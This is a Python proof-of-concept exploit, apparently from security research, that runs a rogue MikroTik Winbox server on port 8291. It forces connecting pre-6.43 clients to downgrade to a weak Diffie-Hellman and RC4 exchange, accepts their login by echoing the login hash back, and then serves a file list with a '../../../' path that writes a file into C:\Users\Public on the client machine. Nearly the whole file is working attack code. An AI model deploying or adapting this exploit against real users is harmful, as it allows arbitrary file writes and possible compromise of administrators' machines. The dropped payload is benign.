import random
import threading
import socket
import sys
import time

##
# This file implements the Winbox server's key exchange and encryption mechanism
# for Winbox before 6.43. The key exchange is Diffie Hellman using a 1984 bit
# non-standard prime and the encryption is a custom RC4 drop-3072 using a 124
# byte session key.
#
# This server won't respond to the initial ECSRP-5 message from the client. When
# that happens, the client will then switch to the DH implementation.
#
# Furthermore, Winbox is vulnerable to directory traversal. A man in the middle
# can write files anywhere on the box. This PoC drops the file "lol.txt" in
# C:\Users\Public\ with the contents of "hello mikrotik"
##

##
# Obj: RC4
#
# An implementation of the RC4 logic used by MikroTik's Winbox on versions
# before 6.43. This is an RC4 drop-3072 with various non-standard mixing. The
# expected key is 0x78 bytes and is half of a session key generated / exchanged
# via Diffie Hellman key exchange.
##
class RC4:
    
    # Standard RC4 drop-3072 initialization except for two things:
    # 1. the value of j, after initializing S, is carried over to future computations
    # 2. the value 'k' is introduced. While not used in the init function itself,
    #    this variable will be used to mix in previous computations in the
    #    "block crypt" function. I'm not sure if this is from some published
    #     variant of RC4 but I do wonder if it can help an attacker understand
    #     the stream state based on known plaintext? 
    def __init__(self, key):

        # init the sbox
        self.S = list(range(0x100))

        j = 0
        for i in range(0x100):
            j = (j + key[i % len(key)] + self.S[i]) & 0xff
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t

        self.i = 0
        self.j = j
        self.k = 0

        # "drop" 3072 of key stream
        for _ in range(0xc00):
            self.gen()

    # Standard RC4 generation. *Only* used by init
    def gen(self):
        i = self.i = (self.i + 1) & 255
        j = self.j = (self.j + self.S[i]) & 255
        t = self.S[i]
        self.S[i] = self.S[j]
        self.S[j] = t
        return self.S[(self.S[i] + self.S[j]) & 255]

    def send_block_crypt(self, data, padding, client = False):
        retval_data = bytearray(data)
        data_length = len(retval_data)
        counter = 0
       
        j = self.j
        while (counter < data_length):
            i = (self.i + counter + 1) & 255
            j = (j + self.k + self.S[i]) & 255 
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t
            retval_data[counter] = data[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]

            if client == True:
                self.k = retval_data[counter]
            else:
                self.k = data[counter]
            counter = counter + 1

        j = self.k + j

        for i in range(256):
            j = (j + self.S[i] & 0xff)
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t

        retval_padding = bytearray(10)
        counter = 0
        while (counter < 10):
            i = (counter + (self.i + data_length + 1)) & 255
            j = (j + self.S[i] & 0xff)
            t = self.S[i]
            self.S[i] = self.S[j]
            self.S[j] = t
            retval_padding[counter] = padding[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]
            counter = counter + 1     

        self.i = data_length + 10
        self.j = j
        if client == False:
            self.k = 0

        return retval_padding + retval_data

def get_request_id(data):
    id_offset = data.find(b'\x06\x00\xff\x09')
    if (id_offset == -1):
        id_offset = data.find(b'\x06\x00\xff\x08')
        if (if_offset == -1):
            return None
        else:
            return data[id_offset:id_offset+6]
    else:
        return data[id_offset:id_offset+5]   

def get_login_hash(data):
    hash_offset = data.find(b'\x0a\x00\x00\x31\x11\x00')
    if (hash_offset == -1):
       return None
    else:
        return data[hash_offset:hash_offset+22]   

def downgrade_attack(sock):
    
    # Currently just listening for messages to 5 (DH) and 6 (ECSRP)
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] == 5):
        print('No need to downgrade. Received DH request.')
    elif (handler[0] == 6):
        # ignore this packet. This should trigger a DH request
        ignore = sock.recv(message_length[0])
            
        # the client should send a DH key exchange request now
        message_length = sock.recv(1)
        handler = sock.recv(1)
        if (handler[0] != 5):
            print('Client didn\'t request a DH key exchange: %x' % handler[0])
            sock.close()
            return
    else:
        print('Client didn\'t request a key exchange: %x' % handler[0])
        sock.close()
        return

    if (message_length[0] != 0xf8):
        print('[-] Client sent unexpected amount of DH public data: %x' % message_length[0])
        sock.close()
        return    

    client_public_bytes = sock.recv(message_length[0])
    client_public = int.from_bytes(client_public_bytes, byteorder='big', signed=False)
    print('[+] Received client\'s public component:')
    print('\t%x' % client_public)
    
    print('[+] Generating a secret:')
    local_secret = random.getrandbits(128)
    print('\t%x' % local_secret)

    print('[+] Computing server\'s public component: ')
    shared_prime = int("B7BA220582B41518F8526BFE0F624DE926106DFB4F719DD93BC4309D49045A4175DB1C58C4D7843D16E766226894B31793B13E789FFD2CF3331267476031B30D2F995237F0B59A33A4F972FB1A618556EF8F332E7A3C366B24FDB39B42B0670B1F90A3D2E8C22E78DDA51A16B46A8E693BB9AED29E8509361BD438E76B1C235FCDD11E70A2B8C0EA15A9DFEA03278F39C12520A0BC36F21694546154C82E065B2EFFD7DDEBD5C1E588F9916F87D80E91303C9435A20E91DD1C9360DEF6A2B0D54FDA44049C0E8CC8A8049CBB1432C6E322D603F41DAA60028C40D78A8653F659C4FFC3F5D8A4E01A5C08E4B04B52388E9EF4A5E24569D15F", 16)
    shared_base = 5
    server_public = pow(shared_base, local_secret, shared_prime)
    print('\t%x' % server_public)
    
    print('[+] Sending server\'s public component to client.')
    sock.sendall(b'\xf8' + b'\x05' + server_public.to_bytes(0xf8, byteorder='big'))

    print('[+] Computing session key:')
    shared_secret = pow(client_public, local_secret, shared_prime)
    print('\t%x' % shared_secret)
    mega_key = shared_secret.to_bytes(0xf8, byteorder='big')
    send_key = mega_key[0x7c:]
    recv_key = mega_key[:0x7c]

    print('[+] Seeding RC4 engines')
    crypto_out = RC4(send_key)
    crypto_in = RC4(recv_key)

    print('[+] Waiting for salt request')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 5):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    if (message_length[0] != 0x38):
        print('[-] Client request is an unexpected length: %x' % message_length[0])
        sock.close()
        return

    print('[+] Received salt request')
    encrypted_salt_request = sock.recv(message_length[0])
    payload = encrypted_salt_request[12:]
    padding = encrypted_salt_request[2:12]

    print('[+] Decrypting the request')
    indata = crypto_in.send_block_crypt(payload, padding, True);

    print('[+] Sending salt response')
    # Our response actually provides a 0 length salt. Which the client seems
    # to happily accept.
    padding = b'\x00'*10
    salt_response = (b'M2\x01\x00\xff\x88\x02\x00\x00\x00\x00\x00' +
        b'\x0b\x00\x00\x00\x02\x00\xff\x88\x02\x00\x0d\x00\x00\x00\x04' +
        b'\x00\x00\x00\x03\x00\xff\x09\x02\x06\x00\xff\x09\x02\x09\x00' +
        b'\x00\x31\x00')
    outdata = crypto_out.send_block_crypt(salt_response, padding);
    print('%x' % len(outdata))
    sock.sendall(b'\x39' + b'\x05' + b'\x00' + b'\x2d' + outdata)

    print('[+] Waiting for a login request')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 5):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    print('[+] Received a login request')
    encrypted_salt_request = sock.recv(message_length[0])
    payload = encrypted_salt_request[12:]
    padding = encrypted_salt_request[2:12]

    print('[+] Decrypting the request')
    indata = crypto_in.send_block_crypt(payload, padding, True);

    request_field = get_request_id(indata)
    hash_field = get_login_hash(indata)

    padding = b'\x00'*10
    login_response = (b'M2\x01\x00\xff\x88\x02\x00\x00\x00\x00\x00\x0b\x00\x00\x00' +
                      b'\x02\x00\xff\x88\x02\x00\x0d\x00\x00\x00\x04\x00\x00\x00' +
                      b'\x13\x00\x00\x00\x0b\x00\x00\x08\xfe\xff\x07\x00' +
                      b'\x0f\x00\x00\x09\x00\x10\x00\x00\x09\x00\x01\x00\xfe\x09\x06' +
                      b'\x03\x00\xff\x09\x02' + request_field +
                      b'\x16\x00\x00\x21\x04\x33\x2e\x31\x31\x17\x00\x00\x21\x03\x78\x38\x36' +
                      b'\x15\x00\x00\x21\x03\x78\x38\x36\x18\x00\x00\x21\x07\x64\x65\x66\x61' +
                      b'\x75\x6c\x74\x11\x00\x00\x21\x04\x69\x33\x38\x36' + hash_field)
    outdata = crypto_out.send_block_crypt(login_response, padding);

    print("%x" % len(outdata))

    sock.sendall(b'\x93' + b'\x05' + b'\x00' + b'\x87' + outdata)

    print('[+] Waiting for list request')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 0x02):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    print('[+] Received list request')
    list_request = sock.recv(message_length[0])
    if (list_request.find(b'list') == -1):
        print('[-] No list in the list request.')
    
    list_response = (b'{ crc: 164562873, size: 36, name: "../../../../../../../../../Users/Public/lol.txt", unique: "advtool-fc1932f6809e.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2939435109, size: 3082, name: "dhcp.jg", unique: "dhcp-eaa3bb8c4b37.jg", version: "6.39.3" },\n' +
                     b'{ crc: 1183779834, size: 12489, name: "dude.jg", unique: "dude-65f18faed649.jg", version: "6.39.3" },\n' +
                     b'{ crc: 444782794, size: 433, name: "gps.jg", unique: "gps-21fa81423a5e.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2740765060, size: 4060, name: "hotspot.jg", unique: "hotspot-2813a8dedd22.jg", version: "6.39.3" },\n' +
                     b'{ crc: 1093970965, size: 22451, name: "icons.png", version: "6.39.3" },\n' +
                     b'{ crc: 1377190509, size: 6389, name: "ipv6.jg", unique: "ipv6-38ef11eebb50.jg", version: "6.39.3" },\n' +
                     b'{ crc: 165461532, size: 1473, name: "kvm.jg", unique: "kvm-6e1029470a44.jg", version: "6.39.3" },\n' +
                     b'{ crc: 667857209, size: 455, name: "lcd.jg", unique: "lcd-30a740bf5375.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2317237032, size: 3578, name: "mpls.jg", unique: "mpls-9e478c42eb58.jg", version: "6.39.3" },\n' +
                     b'{ crc: 332542720, size: 457, name: "ntp.jg", unique: "ntp-412e80e06f88.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2870762863, size: 2342, name: "pim.jg", unique: "pim-fac4ce9edd44.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2324128268, size: 4399, name: "ppp.jg", unique: "ppp-5d3353bc82f1.jg", version: "6.39.3" },\n' +
                     b'{ crc: 1771368162, size: 61639, name: "roteros.jg", unique: "roteros-228bb3ad6def.jg", version: "6.39.3" },\n' +
                     b'{ crc: 2911091806, size: 8240, name: "roting4.jg", unique: "roting4-2cabe59181eb.jg", version: "6.39.3" },\n' +
                     b'{ crc: 367607478, size: 3434, name: "secure.jg", unique: "secure-772b3b028ba8.jg", version: "6.39.3" },\n' +
                     b'{ crc: 1617938236, size: 765, name: "ups.jg", unique: "ups-e29683c8d492.jg", version: "6.39.3" },\n' +
                     b'{ crc: 3264462467, size: 15604, name: "wlan6.jg", unique: "wlan6-032bb1ee138d.jg", version: "6.39.3" },\n')

    ## header
    header = b'\x6c\x69\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x07\x29\x00\x00\x00\x00'
    all_of_it = header + list_response

    chunks = []
    looper = range(0, len(all_of_it), 255)
    for n in looper:
        if ((n + 255) > len(all_of_it)):
            chunks.append(all_of_it[n:])
        else:
            chunks.append(all_of_it[n:n+255])

    # send first bytes
    sock.sendall(b'\xff\x02')
    first = True
    for n in chunks:
        if first == True:
            first = False
            sock.sendall(n)
        else:
            if (len(n) == 255):
                sock.sendall(b'\xff\xff')
                sock.sendall(n)
            else:
                sock.sendall(bytes([len(n)]))
                sock.sendall(b'\xff')
                sock.sendall(n)

    print('[+] Waiting for list close message')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 0x02):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    print('[+] Received list close message')
    list_request = sock.recv(message_length[0])
    if (list_request.find(b'list') == -1):
        print('[-] No list in the list close message.')

    sock.sendall(b'\x12\x02\x6c\x69\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x07\x29')

    print('[+] Waiting for file message')
    message_length = sock.recv(1)
    handler = sock.recv(1)
    if (handler[0] != 0x02):
        print('[-] Client sent unexpected handler: %x' % handler[0])
        sock.close()
        return

    print('[+] Received file message')
    list_request = sock.recv(message_length[0])
    if (list_request.find(b'../../../') == -1):
        print('[-] No lol.txt in the list close message.')

    header = b'../../../.\x00\x01\x24\x00\x00\x00\x00\x00'
    gzip = b'\x1f\x8b\x08\x08\x62\x85\x1f\x5e\x00\x03\x6c\x6f\x6c\x00\xcb\xc8\x54\xc8\xcd\xcc\x2e\xca\x2f\xc9\xcc\xe6\x02\x00\xc8\x62\x79\x42\x0c\x00\x00\x00'

    all_of_it = header + gzip

    # send first bytes
    sock.sendall(bytes([len(all_of_it)]))
    sock.sendall(b'\x02')
    sock.sendall(all_of_it)

    sock.close()
    return


if __name__ == '__main__':

    # bind to 8291 on all interfaces
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8291))
    server.listen(5)
    print('[+] Listening on 0.0.0.0:8291')

    while True:
        client_sock, address = server.accept()
        print('[+] Accepted connection from %s:%s' % (address[0], address[1]))
        client_handler = threading.Thread(target=downgrade_attack, args=(client_sock,))
        client_handler.start()

